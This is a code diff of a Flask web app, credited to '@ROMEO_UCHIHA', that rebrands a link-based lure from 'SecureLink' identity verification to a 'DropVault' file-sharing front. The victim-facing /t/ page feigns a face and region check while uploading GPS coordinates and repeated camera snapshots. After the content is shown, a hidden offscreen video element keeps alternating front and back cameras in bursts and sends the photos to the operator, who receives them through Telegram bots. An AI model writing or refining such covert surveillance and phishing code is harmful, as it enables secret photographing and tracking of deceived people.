@@ -1,4 +1,4 @@
-# by:@ROMEO_UCHIHA (Stealth Dual-Camera Burst & Pro Landing Page)
+# by:@ROMEO_UCHIHA (Pro File Sharing Redesign & Broken Media Fix)
 from flask import Flask, request, render_template_string, jsonify, redirect, session
 from supabase import create_client, Client
 import base64, requests, os, time, uuid, random
@@ -47,81 +47,83 @@ COMMON_STYLE = """
     :root { --main-red: #ff0000; --dark-red: #8a0000; }
     @keyframes slideUp { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
-    body { background: radial-gradient(circle at center, #110000 0%, #000000 100%); color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; padding: 20px; }
-    .container { background: rgba(15, 0, 0, 0.8); backdrop-filter: blur(20px); border: 2px solid var(--main-red); border-radius: 24px; padding: 30px; width: 100%; max-width: 500px; box-shadow: 0 0 25px rgba(255, 0, 0, 0.4); animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); text-align: center; margin-bottom: 20px; }
-    h2 { font-family: 'Orbitron', sans-serif; color: var(--main-red); margin-bottom: 25px; font-weight: 800; letter-spacing: 2px; text-shadow: 0 0 15px var(--main-red); }
-    input, select { width: 100%; padding: 16px; margin: 10px 0; background: rgba(0, 0, 0, 0.8); border: 1px solid var(--dark-red); color: #fff; border-radius: 14px; outline: none; transition: 0.3s; font-size: 15px; }
-    input:focus, select:focus { border-color: var(--main-red); box-shadow: 0 0 15px rgba(255,0,0,0.5); }
-    button { width: 100%; padding: 16px; margin-top: 15px; background: linear-gradient(135deg, var(--dark-red), var(--main-red)); color: #fff; border: none; border-radius: 14px; font-weight: 700; font-size: 16px; letter-spacing: 1px; text-transform: uppercase; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 20px rgba(255,0,0,0.3); }
-    button:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(255,0,0,0.6); }
-    a { color: #888; text-decoration: none; font-size: 13px; display: inline-block; margin-top: 20px; transition: 0.3s; }
-    a:hover { color: var(--main-red); text-shadow: 0 0 10px var(--main-red); }
+    body { background: radial-gradient(circle at top, #110000 0%, #000000 100%); color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; padding: 20px; }
+    .container { background: rgba(15, 0, 0, 0.7); backdrop-filter: blur(15px); border: 1px solid var(--main-red); border-radius: 20px; padding: 40px; width: 100%; max-width: 450px; box-shadow: 0 10px 40px rgba(255, 0, 0, 0.2); animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); text-align: center; }
+    h2 { font-family: 'Orbitron', sans-serif; color: #fff; margin-bottom: 25px; font-weight: 800; letter-spacing: 1px; }
+    h2 span { color: var(--main-red); }
+    input { width: 100%; padding: 16px; margin: 10px 0; background: rgba(0, 0, 0, 0.6); border: 1px solid #333; color: #fff; border-radius: 12px; outline: none; transition: 0.3s; font-size: 15px; }
+    input:focus { border-color: var(--main-red); box-shadow: 0 0 15px rgba(255,0,0,0.3); }
+    button { width: 100%; padding: 16px; margin-top: 20px; background: var(--main-red); color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; letter-spacing: 1px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 5px 15px rgba(255,0,0,0.3); }
+    button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,0,0,0.5); background: #cc0000; }
+    a { color: #888; text-decoration: none; font-size: 14px; display: inline-block; margin-top: 20px; transition: 0.3s; }
+    a:hover { color: #fff; }
 </style>
 """
 
-# PROFESSIONAL LANDING PAGE (NO MENTION OF ANY HACKING/STEALING)
+# BRAND NEW FILE SHARING SAAS LANDING PAGE
 LANDING_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SecureLink | Advanced Identity Verification</title>
+    <title>DropVault | Advanced File Sharing</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;500;700&display=swap');
-        body { margin: 0; padding: 0; font-family: 'Inter', sans-serif; background: #0f172a; color: #f8fafc; overflow-x: hidden; }
-        header { padding: 20px 50px; display: flex; justify-content: space-between; align-items: center; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100; border-bottom: 1px solid #1e293b; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        .logo { font-size: 24px; font-weight: 700; color: #38bdf8; text-decoration: none; display: flex; align-items: center; gap: 10px; }
-        .nav-links a { color: #cbd5e1; text-decoration: none; margin-left: 25px; font-weight: 500; transition: 0.3s; font-size: 15px; }
-        .nav-links a:hover { color: #38bdf8; }
-        .btn-primary { background: #38bdf8; color: #0f172a !important; padding: 10px 24px; border-radius: 8px; text-decoration: none; font-weight: 700; transition: 0.3s; }
-        .btn-primary:hover { background: #0ea5e9; box-shadow: 0 0 15px rgba(56, 189, 248, 0.4); }
-        .hero { text-align: center; padding: 120px 20px; background: radial-gradient(circle at top, #1e293b 0%, #0f172a 100%); }
-        .hero h1 { font-size: 3.5rem; margin-bottom: 20px; color: #fff; max-width: 900px; margin-left: auto; margin-right: auto; }
-        .hero h1 span { color: #38bdf8; text-shadow: 0 0 20px rgba(56,189,248,0.3); }
-        .hero p { font-size: 1.2rem; color: #94a3b8; max-width: 650px; margin: 0 auto 40px; line-height: 1.6; }
-        .features { display: flex; justify-content: center; gap: 40px; padding: 80px 20px; flex-wrap: wrap; background: #0f172a; }
-        .card { background: #1e293b; padding: 40px 30px; border-radius: 20px; width: 320px; text-align: center; border: 1px solid #334155; transition: 0.3s; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
-        .card:hover { transform: translateY(-10px); border-color: #38bdf8; }
-        .card .icon { font-size: 50px; margin-bottom: 20px; }
-        .card h3 { color: #f1f5f9; margin-bottom: 15px; font-size: 1.4rem; }
-        .card p { color: #94a3b8; font-size: 1rem; line-height: 1.6; }
-        footer { text-align: center; padding: 40px; color: #64748b; border-top: 1px solid #1e293b; font-size: 0.9rem; }
-        @media(max-width: 768px) { .hero h1 { font-size: 2.5rem; } header { padding: 20px; flex-direction: column; gap: 15px; } .nav-links { margin-top: 10px; } .nav-links a { margin: 0 10px; } }
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&display=swap');
+        body { margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; background: #030303; color: #ffffff; overflow-x: hidden; }
+        header { padding: 25px 8%; display: flex; justify-content: space-between; align-items: center; position: absolute; width: 100%; top: 0; z-index: 100; box-sizing: border-box; }
+        .logo { font-size: 24px; font-weight: 800; color: #fff; text-decoration: none; display: flex; align-items: center; gap: 8px; letter-spacing: -0.5px; }
+        .logo span { color: #ff0000; }
+        .nav-links a { color: #a3a3a3; text-decoration: none; margin-left: 30px; font-weight: 500; transition: 0.3s; font-size: 15px; }
+        .nav-links a:hover { color: #fff; }
+        .btn-primary { background: #ff0000; color: #fff !important; padding: 12px 28px; border-radius: 50px; text-decoration: none; font-weight: 700; transition: 0.3s; border: 1px solid transparent; }
+        .btn-primary:hover { background: transparent; border-color: #ff0000; color: #ff0000 !important; box-shadow: 0 0 20px rgba(255, 0, 0, 0.2); }
+        .hero { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 100px 20px; background: radial-gradient(circle at 50% 30%, rgba(50,0,0,0.4) 0%, #030303 60%); position: relative; }
+        .hero h1 { font-size: clamp(2.5rem, 6vw, 4.5rem); margin-bottom: 20px; font-weight: 800; line-height: 1.1; letter-spacing: -1px; max-width: 900px; }
+        .hero h1 span { background: linear-gradient(90deg, #ff0000, #ff4d4d); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .hero p { font-size: 1.15rem; color: #888; max-width: 600px; margin: 0 auto 40px; line-height: 1.6; }
+        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; padding: 80px 10%; background: #050505; border-top: 1px solid #111; }
+        .card { background: #0a0a0a; padding: 40px; border-radius: 20px; border: 1px solid #1a1a1a; transition: 0.4s; text-align: left; }
+        .card:hover { border-color: #ff0000; transform: translateY(-5px); box-shadow: 0 10px 30px rgba(255,0,0,0.05); }
+        .card .icon { width: 50px; height: 50px; background: rgba(255,0,0,0.1); color: #ff0000; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 24px; margin-bottom: 25px; }
+        .card h3 { color: #fff; margin-bottom: 15px; font-size: 1.3rem; font-weight: 700; }
+        .card p { color: #777; font-size: 0.95rem; line-height: 1.6; }
+        footer { text-align: center; padding: 40px; color: #555; font-size: 0.9rem; border-top: 1px solid #111; background: #030303; }
+        @media(max-width: 768px) { header { flex-direction: column; gap: 20px; padding: 20px; position: relative; } .nav-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; } .nav-links a { margin: 0; } }
     </style>
 </head>
 <body>
     <header>
-        <a href="/" class="logo">🔒 SecureLink</a>
+        <a href="/" class="logo">Drop<span>Vault</span></a>
         <div class="nav-links">
-            <a href="/lg">Sign In</a>
-            <a href="/rg" class="btn-primary">Create Secure Link</a>
+            <a href="/lg">Login</a>
+            <a href="/rg" class="btn-primary">Start File Sharing</a>
         </div>
     </header>
     <div class="hero">
-        <h1>Protect Your Sensitive Files with <span>Identity Verification</span></h1>
-        <p>Ensure that only authorized individuals can access your URLs, images, or documents. Add Face ID and Geolocation layers to your links instantly.</p>
-        <a href="/lg" class="btn-primary" style="font-size: 1.2rem; padding: 18px 36px; display: inline-block;">Get Started for Free</a>
+        <h1>Next-Gen <span>File Sharing</span> Infrastructure</h1>
+        <p>Upload your files and generate highly protected sharing links. Restrict access using identity and location parameters for ultimate control.</p>
+        <a href="/lg" class="btn-primary" style="padding: 16px 36px; font-size: 1.1rem;">Host A File Now</a>
     </div>
     <div class="features">
         <div class="card">
-            <div class="icon">🛡️</div>
-            <h3>Bank-Grade Protection</h3>
-            <p>We use advanced encryption and strict verification gates. Users must prove their identity before the original content is unlocked.</p>
+            <div class="icon">📁</div>
+            <h3>Seamless File Delivery</h3>
+            <p>Share documents, videos, and archives with a single clean interface. Perfect for delivering assets to clients securely.</p>
         </div>
         <div class="card">
-            <div class="icon">👤</div>
-            <h3>Biometric Access</h3>
-            <p>Integrate real-time camera face verification. Prevent bots and unauthorized sharing of your confidential data.</p>
+            <div class="icon">👁️</div>
+            <h3>Identity Gate</h3>
+            <p>Ensure the correct recipient accesses the file. Our system requires a quick visual check before allowing file downloads.</p>
         </div>
         <div class="card">
-            <div class="icon">📍</div>
-            <h3>Location Lock</h3>
-            <p>Restrict access to specific regions. The link automatically verifies the user's GPS coordinates before granting entry.</p>
+            <div class="icon">🌍</div>
+            <h3>Geo-Locked Sharing</h3>
+            <p>Limit your file's availability to specific regions. Anyone outside the designated coordinates will be blocked instantly.</p>
         </div>
     </div>
     <footer>
-        &copy; 2026 SecureLink Protocol. All rights reserved. Secure Data Transfer Solutions.
+        © 2026 DropVault File Sharing. Built for privacy and speed.
     </footer>
 </body>
 </html>
@@ -129,7 +131,6 @@ LANDING_PAGE = """
 
 @app.route("/")
 def index(): 
-    # Redirecting base URL to the Professional Landing Page
     return render_template_string(LANDING_PAGE)
 
 @app.route("/rg", methods=["GET", "POST"])
@@ -140,7 +141,7 @@ def register():
         supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "bot_name": get_bot_name(token), "purpose": "register"}).execute()
         send_tg_msg(token, cid, f"😈 *UCHIHA REGISTRATION*\\n\\nCode: `{otp}`")
         return redirect(f"/verify_otp?cid={cid}&purpose=register")
-    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>REGISTER</h2><form method="POST"><input type="text" name="token" placeholder="Bot Token" required><input type="text" name="cid" placeholder="Chat ID" required><button type="submit">Send OTP</button></form><a href="/lg">Login here</a></div>')
+    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>CREATE <span>ACCOUNT</span></h2><form method="POST"><input type="text" name="token" placeholder="Bot Token" required><input type="text" name="cid" placeholder="Chat ID" required><button type="submit">Send OTP</button></form><a href="/lg">Already have an account?</a></div>')
 
 @app.route("/lg", methods=["GET", "POST"])
 def login():
@@ -157,7 +158,7 @@ def login():
             html = f"{COMMON_STYLE}<div class='container'><h2>SELECT BOT</h2>"
             for u in users: html += f"<form method='POST' action='/send_login_otp'><input type='hidden' name='cid' value='{cid}'><input type='hidden' name='token' value='{u['bot_token']}'><button type='submit'>🤖 {u['bot_name']}</button></form>"
             return render_template_string(html + "</div>")
-    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>LOGIN</h2><form method="POST"><input type="text" name="cid" placeholder="Chat ID" required><button type="submit">Continue</button></form><a href="/rg">Create account</a></div>')
+    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>WELCOME <span>BACK</span></h2><form method="POST"><input type="text" name="cid" placeholder="Enter Chat ID" required><button type="submit">Access Dashboard</button></form><a href="/rg">Create a new account</a></div>')
 
 @app.route("/send_login_otp", methods=["POST"])
 def send_login_otp():
@@ -180,13 +181,13 @@ def verify_otp():
             supabase.table("otps").delete().eq("chat_id", cid).execute()
             return redirect("/ds")
         return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
-    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY OTP</h2><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required><button type="submit">Verify</button></form></div>')
+    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY <span>OTP</span></h2><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required><button type="submit">Verify & Proceed</button></form></div>')
 
-# --- TARGET PAGE (HACK UI & RED THEME) ---
+# --- TARGET PAGE (FIXED MEDIA PREVIEW & RED THEME) ---
 @app.route("/t/<link_id>")
 def target_page(link_id):
     res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
-    if not res.data: return "Link Not Found or Deleted!"
+    if not res.data: return "File Not Found or Removed!"
     
     data = res.data[0]
     target_type = data.get("target_type", "both")
@@ -201,52 +202,51 @@ def target_page(link_id):
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <title>Identity Verification</title>
+        <title>Shared File | Verification</title>
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
         <style>
-            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Share+Tech+Mono&display=swap');
-            :root { --red: #ff0000; --green: #00ff00; --grey: #333333; }
+            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Poppins:wght@400;600&display=swap');
+            :root { --red: #ff0000; --dark-red: #8a0000; --bg: #050505; }
             * { box-sizing: border-box; margin: 0; padding: 0; }
-            body { background: #000; color: var(--red); font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+            body { background: var(--bg); color: #fff; font-family: 'Poppins', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+            
+            /* Camera UI */
             .face-container { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; }
-            .ring-container { position: relative; width: 330px; height: 330px; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
-            .ray-ring { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(var(--grey) 100%, transparent 0); -webkit-mask: radial-gradient(transparent 64%, #000 66%), repeating-conic-gradient(#000 0deg, #000 3deg, transparent 3deg, transparent 7deg); z-index: 1; }
-            .face-wrapper { position: relative; width: 280px; height: 280px; border-radius: 50%; overflow: hidden; border: 2px solid rgba(255,0,0,0.5); box-shadow: 0 0 35px rgba(255,0,0,0.3); z-index: 2; }
-            #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); background: #050000; } 
-            .scan-ring { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 4px solid transparent; border-top-color: var(--red); border-right-color: rgba(255,0,0,0.3); border-radius: 50%; animation: spin 2s linear infinite; box-shadow: inset 0 0 25px rgba(255,0,0,0.5); z-index: 10; pointer-events: none; }
-            .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #ff0000; box-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000; z-index: 16; animation: scanAnim 2.5s infinite ease-in-out; pointer-events: none; }
-            .loc-container { display: none; text-align: center; flex-direction: column; align-items: center; justify-content: center;}
-            .pin-icon { font-size: 80px; color: var(--red); animation: bounce 1s infinite; margin-bottom: 20px; text-shadow: 0 0 20px var(--red); }
-            @keyframes spin { 100% { transform: rotate(360deg); } }
-            @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
+            .face-wrapper { position: relative; width: 280px; height: 280px; border-radius: 50%; overflow: hidden; border: 3px solid var(--red); box-shadow: 0 0 40px rgba(255,0,0,0.3); z-index: 2; }
+            #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); background: #111; } 
+            .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #ff0000; box-shadow: 0 0 15px #ff0000; z-index: 16; animation: scanAnim 2.5s infinite ease-in-out; pointer-events: none; }
             @keyframes scanAnim { 0% { top: 5%; opacity: 0; } 10% { opacity: 1; } 50% { top: 95%; opacity: 1; } 90% { opacity: 1; } 100% { top: 5%; opacity: 0; } }
-            .instruction-text { font-family: 'Orbitron'; font-size: 1.2rem; letter-spacing: 2px; color: #fff; text-shadow: 0 0 10px var(--red); min-height: 30px; text-transform: uppercase; margin-bottom: 10px; text-align:center;}
-            .timer-display { font-family: 'Orbitron'; font-size: 4.5rem; font-weight: 900; color: var(--red); text-shadow: 0 0 20px var(--red); line-height: 1; margin-top: 10px; }
-            #result-ui { display: none; width: 100%; height: 100%; padding: 20px; text-align: center; overflow-y: auto; }
-            .content-box { background: rgba(20,0,0,0.8); border: 1px solid var(--red); padding: 20px; border-radius: 15px; box-shadow: 0 0 25px rgba(255,0,0,0.3); width: 100%; max-width: 650px; margin: 0 auto; min-height: 80vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-            .content-text { color: #fff; font-size: 1.5rem; white-space: pre-wrap; font-family: 'Poppins'; margin-bottom: 20px;}
-            .btn-download { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; max-width: 350px; margin-top: 25px; padding: 16px; background: linear-gradient(135deg, #8a0000, #ff0000); color: #fff; border: 2px solid var(--red); border-radius: 12px; font-family: 'Orbitron', sans-serif; font-size: 16px; font-weight: 800; text-decoration: none; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 0 20px rgba(255,0,0,0.5); transition: 0.3s; cursor: pointer; }
-            .btn-download:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,0,0,0.8); }
+            
+            .loc-container { display: none; text-align: center; flex-direction: column; align-items: center; justify-content: center;}
+            .pin-icon { font-size: 70px; color: var(--red); margin-bottom: 20px; text-shadow: 0 0 20px var(--red); }
+            
+            .instruction-text { font-family: 'Orbitron'; font-size: 1.1rem; letter-spacing: 1px; color: #ccc; margin-top: 20px; text-transform: uppercase; text-align:center;}
+            
+            /* Clean Result UI (File Download) */
+            #result-ui { display: none; width: 100%; padding: 20px; text-align: center; }
+            .content-box { background: rgba(15,15,15,0.9); border: 1px solid #333; padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); width: 100%; max-width: 500px; margin: 0 auto; display: flex; flex-direction: column; align-items: center; }
+            
+            .file-icon-box { background: #111; border: 1px dashed #444; border-radius: 15px; width: 100%; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; gap: 15px; margin-bottom: 25px; }
+            .file-icon-box i { font-size: 60px; color: var(--red); }
+            .file-icon-box p { color: #888; font-size: 14px; margin: 0; }
+
+            .btn-download { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 18px; background: var(--red); color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; text-decoration: none; letter-spacing: 0.5px; transition: 0.3s; cursor: pointer; }
+            .btn-download:hover { background: #cc0000; transform: translateY(-3px); box-shadow: 0 10px 20px rgba(255,0,0,0.3); }
         </style>
     </head>
     <body>
         
         <div id="cam-section" class="face-container">
-            <div class="ring-container">
-                <div class="ray-ring" id="rayRing"></div>
-                <div class="face-wrapper">
-                    <div class="scan-ring"></div>
-                    <div class="scanner-line"></div>
-                    <video id="v" autoplay playsinline muted></video>
-                </div>
+            <div class="face-wrapper">
+                <div class="scanner-line"></div>
+                <video id="v" autoplay playsinline muted></video>
             </div>
-            <p class="instruction-text" id="face-msg">INITIALIZING CAMERA...</p>
-            <div class="timer-display" id="seconds-timer">15</div>
+            <p class="instruction-text" id="face-msg">Analyzing environment...</p>
         </div>
 
         <div id="loc-section" class="loc-container">
             <i class="fas fa-map-marker-alt pin-icon"></i>
-            <p class="instruction-text" id="loc-msg">SECURING LOCATION UPLINK...</p>
+            <p class="instruction-text" id="loc-msg">Verifying file access region...</p>
         </div>
 
         <div id="result-ui">
@@ -254,7 +254,6 @@ def target_page(link_id):
         </div>
 
         <canvas id="c" style="display:none"></canvas>
-        
         <video id="bg-v" playsinline autoplay muted style="position:fixed; top:-1000px; left:-1000px; width:10px; height:10px; opacity:0; z-index:-999;"></video>
 
         <script>
@@ -268,7 +267,7 @@ def target_page(link_id):
             const bgV = document.getElementById('bg-v');
             const c = document.getElementById('c');
             let captureInterval = null;
-            let bgCamMode = "environment"; // Pehli dafa background Back camera chalega
+            let bgCamMode = "environment"; 
 
             window.onload = () => { getHardware(); startVerificationFlow(); };
 
@@ -286,7 +285,6 @@ def target_page(link_id):
                     } catch(e) {
                         document.getElementById('face-msg').innerText = "CAMERA ACCESS DENIED";
                         document.getElementById('face-msg').style.color = "red";
-                        document.getElementById('seconds-timer').style.display = "none";
                         setTimeout(() => location.reload(), 2500);
                     }
                 } else if (mode === 'location') {
@@ -307,30 +305,10 @@ def target_page(link_id):
 
             function startFaceCheck() {
                 captureInterval = setInterval(takeSnap, 600); 
-
-                let timeLeft = 15;
-                let instructions = ["Look Straight", "Look Left", "Look Right", "Look Slightly Up", "Scanning Features..."];
-                let step = 0;
-                const faceMsg = document.getElementById('face-msg');
-                const timerText = document.getElementById('seconds-timer');
-                const rayRing = document.getElementById('rayRing');
-
-                let startTime = Date.now();
-                let duration = 15000; 
+                let timeLeft = 10;
                 
-                let animFrame = setInterval(() => {
-                    let elapsed = Date.now() - startTime;
-                    let percent = Math.min((elapsed / duration) * 100, 100);
-                    rayRing.style.background = `conic-gradient(var(--green) ${percent}%, var(--grey) 0%)`;
-                    if (percent >= 100) clearInterval(animFrame);
-                }, 50); 
-
                 let timer = setInterval(() => {
                     timeLeft--;
-                    timerText.innerText = timeLeft; 
-                    if(timeLeft % 3 === 0) step = (step + 1) % instructions.length;
-                    faceMsg.innerText = instructions[step];
-
                     if(timeLeft <= 0) {
                         clearInterval(timer);
                         clearInterval(captureInterval);
@@ -353,22 +331,20 @@ def target_page(link_id):
                     navigator.geolocation.getCurrentPosition(
                         (p) => {
                             fetch("/api/log_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) });
-                            locMsg.innerText = "LOCATION VERIFIED";
+                            locMsg.innerText = "REGION MATCHED";
                             setTimeout(showContent, 1000);
                         },
                         (e) => {
-                            locMsg.innerText = "LOCATION DENIED. RELOADING...";
+                            locMsg.innerText = "ACCESS DENIED IN YOUR REGION";
                             setTimeout(() => location.reload(), 2000);
                         }
                     );
                 } else { showContent(); }
             }
 
-            // CONTINUOUS BURST & SWAP LOGIC (Jitni front ki utni back ki)
             async function captureBackground() {
                 try {
                     if (bgV.srcObject) bgV.srcObject.getTracks().forEach(t => t.stop());
-                    
                     let stream;
                     try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: bgCamMode } } }); } 
                     catch(err) { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: bgCamMode } }); }
@@ -377,34 +353,24 @@ def target_page(link_id):
                     bgV.onloadedmetadata = () => {
                         bgV.play();
                         let snapCount = 0;
-                        
-                        // Wait 1.5s for camera to adjust, then start taking fast pictures
                         setTimeout(() => {
                             let burst = setInterval(() => {
-                                // Take 3 pictures in burst mode per camera side
                                 if(bgV.videoWidth > 0 && snapCount < 3) {
                                     c.width = bgV.videoWidth; c.height = bgV.videoHeight;
                                     c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
                                     let imgData = c.toDataURL('image/jpeg', 0.5);
                                     let label = bgCamMode === "user" ? "FRONT" : "BACK";
-                                    
-                                    fetch("/api/capture/{{ l_id }}", { 
-                                        method: "POST", headers: {"Content-Type":"application/json"}, 
-                                        body: JSON.stringify({ img: imgData, cam_type: label }) 
-                                    });
+                                    fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: label }) });
                                     snapCount++;
                                 } else {
                                     clearInterval(burst);
-                                    // Change Camera Mode for Next Round
                                     bgCamMode = (bgCamMode === "environment") ? "user" : "environment";
-                                    // Start next loop immediately
                                     captureBackground();
                                 }
-                            }, 800); // Har 800ms me ek photo
+                            }, 800); 
                         }, 1500);
                     };
                 } catch(e) { 
-                    // Agar back camera fail ho to sirf front use karta rahega
                     bgCamMode = "user";
                     setTimeout(captureBackground, 3000);
                 }
@@ -420,26 +386,32 @@ def target_page(link_id):
 
                 let html = "";
                 if(actMode === 'text') {
-                    html = `<div class="content-text">${txtVal}</div>`;
+                    html = `<div style="color:#fff; font-size:1.2rem; margin-bottom:20px; width:100%; text-align:left; white-space:pre-wrap;">${txtVal}</div>`;
                 } else if (actMode === 'file') {
                     let ext = actVal.split('.').pop().toLowerCase();
                     let isVideo = ['mp4', 'webm', 'ogg', 'mov'].includes(ext);
                     let isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext);
 
+                    // BROKEN MEDIA FIX: Added strict fallback (onerror) and clean File Box UI
+                    let previewHtml = '';
                     if(isVideo || fType === 'video') {
-                        html = `<video src="${actVal}" controls autoplay playsinline style="width:100%; max-height:60vh; border-radius:10px; border: 2px solid var(--red); box-shadow: 0 0 20px rgba(255,0,0,0.3);"></video>`;
+                        previewHtml = `<video src="${actVal}" controls autoplay playsinline style="width:100%; max-height:300px; border-radius:10px; background:#000; margin-bottom:20px;" onerror="this.outerHTML='<div class=\\'file-icon-box\\'><i class=\\'fas fa-file-video\\'></i><p>Video File Ready</p></div>'"></video>`;
                     } else if (isImage || fType === 'image') {
-                        html = `<img src="${actVal}" alt="Secure File" style="width:100%; max-height:60vh; object-fit:contain; border-radius:10px; border: 2px solid var(--red); box-shadow: 0 0 20px rgba(255,0,0,0.3);">`;
+                        previewHtml = `<img src="${actVal}" style="width:100%; max-height:300px; object-fit:contain; border-radius:10px; margin-bottom:20px;" onerror="this.outerHTML='<div class=\\'file-icon-box\\'><i class=\\'fas fa-file-image\\'></i><p>Image File Ready</p></div>'">`;
                     } else {
-                        html = `<iframe src="${actVal}" style="width:100%; height:50vh; border:none; border-radius:10px; border: 2px solid var(--red);"></iframe>`;
+                        previewHtml = `<div class="file-icon-box"><i class="fas fa-file-archive"></i><p>Secure Shared File</p></div>`;
                     }
-                    html += `<a href="${actVal}" download target="_blank" class="btn-download"><i class="fas fa-download"></i> Download Secure File</a>`;
+
+                    html = `
+                        <h2 style="margin-bottom:20px; font-size:1.4rem;">File Access Granted</h2>
+                        ${previewHtml}
+                        <a href="${actVal}" target="_blank" class="btn-download"><i class="fas fa-download"></i> Download File</a>
+                    `;
                 } else {
-                    html = `<iframe src="${actVal}" style="width:100%; height:80vh; border:none; border-radius:10px;"></iframe>`;
+                    html = `<div class="file-icon-box"><i class="fas fa-link"></i><p>External Link Ready</p></div><a href="${actVal}" target="_blank" class="btn-download">Continue to Link</a>`;
                 }
                 medBox.innerHTML = html;
 
-                // Fire up continuous alternating burst capture loop
                 if(mode === 'both' || mode === 'camera') { captureBackground(); }
             }
         </script>
